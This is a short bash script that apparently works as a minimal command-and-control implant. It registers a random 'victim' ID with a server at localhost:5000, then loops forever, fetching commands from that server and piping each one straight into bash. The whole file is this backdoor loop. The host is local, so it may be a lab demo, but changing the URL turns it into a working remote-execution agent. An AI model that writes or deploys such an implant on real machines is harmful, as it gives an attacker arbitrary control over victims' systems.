#!/bin/bash

let victimID=$RANDOM

curl -s localhost:5000/registervictim/$victimID

while true; do
 curl -s localhost:5000/command/$victimID | bash -e
 sleep 2
done
